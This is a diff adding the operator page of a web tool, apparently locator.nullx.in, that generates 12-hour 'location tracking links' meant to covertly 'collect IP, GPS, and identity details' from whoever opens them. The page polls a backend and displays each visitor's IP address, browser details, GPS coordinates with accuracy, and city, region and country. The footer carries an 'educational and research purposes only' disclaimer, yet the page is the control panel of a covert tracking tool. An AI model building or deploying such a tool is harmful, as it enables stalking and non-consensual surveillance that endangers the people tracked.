@@ -1,1 +1,211 @@
-<!-- session.html content goes here -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Generate Location Tracking Link</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #f8f9fa;
+      font-family: 'Segoe UI', sans-serif;
+      transition: background-color 0.3s, color 0.3s;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 800px;
+      margin-top: 60px;
+      flex-grow: 1;
+    }
+
+    .card {
+      border: none;
+      border-radius: 1rem;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .card-header {
+      font-size: 1.5rem;
+      font-weight: 600;
+    }
+
+    .btn-success {
+      font-size: 1.2rem;
+    }
+
+    .tracking-link {
+      word-break: break-all;
+      font-size: 1rem;
+      color: #0d6efd;
+    }
+
+    pre {
+      background-color: #f1f1f1;
+      padding: 15px;
+      border-radius: 8px;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px 10px 10px;
+      font-size: 0.85rem;
+      color: #666;
+      border-top: 1px solid #ccc;
+    }
+
+    /* Dark Mode */
+    .dark-mode {
+      background-color: #1a1a1a !important;
+      color: #f0f0f0 !important;
+    }
+
+    .dark-mode .card {
+      background-color: #2a2a2a !important;
+      color: #f0f0f0 !important;
+    }
+
+    .dark-mode .btn-success {
+      background-color: #198754;
+      color: #fff;
+    }
+
+    .dark-mode .text-danger,
+    .dark-mode .text-primary {
+      color: #f87171 !important;
+    }
+
+    .dark-mode .tracking-link {
+      color: #63b3ed;
+    }
+
+    .dark-mode pre {
+      background-color: #333;
+      color: #eee;
+    }
+
+    .dark-mode footer {
+      background-color: #111;
+      color: #aaa;
+      border-color: #333;
+    }
+
+    .dark-toggle {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      cursor: pointer;
+      font-size: 1.3rem;
+      background: none;
+      border: none;
+      color: #6c757d;
+      transition: color 0.3s;
+    }
+
+    .dark-toggle:hover {
+      color: #000;
+    }
+
+    .dark-mode .dark-toggle:hover {
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <button class="dark-toggle" onclick="toggleDarkMode()" id="modeToggle" title="Toggle Dark Mode">🌙</button>
+
+  <div class="container text-center">
+    <h2 class="mb-4">
+      <i class="bi bi-geo-alt-fill text-danger"></i> Generate Location Tracking Link
+    </h2>
+    <p class="mb-4 text-muted">This link is valid for 12 hours. Share it to collect IP, GPS, and identity details.</p>
+
+    <div class="card mb-4 p-3">
+      <button class="btn btn-success w-100" onclick="generateLink()">
+        <i class="bi bi-bullseye"></i> Generate
+      </button>
+    </div>
+
+    <div id="linkCard" class="card mb-4 p-3 d-none">
+      <div class="mb-2 fw-bold">
+        <i class="bi bi-pin-map-fill text-primary"></i> Your Tracking Link:
+      </div>
+      <div class="tracking-link" id="generatedLink"></div>
+    </div>
+
+    <div class="card p-3 mb-4">
+      <div class="fw-bold mb-2 text-danger">
+        <i class="bi bi-journal-text"></i> Collected Data:
+      </div>
+      <div id="logData">No logs yet.</div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="text-muted mb-1">
+      © 2025 <strong>locator.nullx.in</strong> — All rights reserved.
+    </div>
+    <div>
+      ⚠️ This platform is strictly for educational and research purposes only. The creators are not responsible for any misuse or illegal activity. Use responsibly and in compliance with all applicable laws.
+    </div>
+  </footer>
+
+  <script>
+    const sessionId = "{{ session_id }}";
+    const linkCard = document.getElementById("linkCard");
+    const linkElem = document.getElementById("generatedLink");
+    const logElem = document.getElementById("logData");
+
+    async function generateLink() {
+      const res = await fetch(`/api/create_link/${sessionId}`, { method: "POST" });
+      const data = await res.json();
+      if (data.link) {
+        linkCard.classList.remove("d-none");
+        linkElem.textContent = data.link;
+      }
+    }
+
+    async function fetchLogs() {
+      const res = await fetch(`/api/session/${sessionId}`);
+      const data = await res.json();
+      const logs = data.logs;
+      if (!logs.length) return;
+
+      logElem.innerHTML = '';
+      logs.forEach(log => {
+        const div = document.createElement("div");
+        div.innerHTML = `
+          <pre>
+Access Time: ${log.timestamp}
+IP Address: ${log.ip}
+Browser Details: ${log.ua}
+Latitude and Longitude: ${log.gps_failed ? 'GPS: Not Available' : `GPS: lat=${log.lat} lon=${log.lon} ±${log.acc}m`}
+Location: City: ${log.geo.city || 'Unknown'}, Region: ${log.geo.region || 'Unknown'}, Country: ${log.geo.country_name || 'Unknown'}
+Other details: N/A
+          </pre>`;
+        logElem.appendChild(div);
+      });
+    }
+
+    function toggleDarkMode() {
+      document.body.classList.toggle("dark-mode");
+      const toggleBtn = document.getElementById("modeToggle");
+      toggleBtn.textContent = document.body.classList.contains("dark-mode") ? "☀️" : "🌙";
+      localStorage.setItem("darkMode", document.body.classList.contains("dark-mode"));
+    }
+
+    window.onload = () => {
+      const prefersDark = localStorage.getItem("darkMode") === "true";
+      if (prefersDark) {
+        document.body.classList.add("dark-mode");
+        document.getElementById("modeToggle").textContent = "☀️";
+      }
+      fetchLogs();
+      setInterval(fetchLogs, 8000);
+    };
+  </script>
+</body>
+</html>
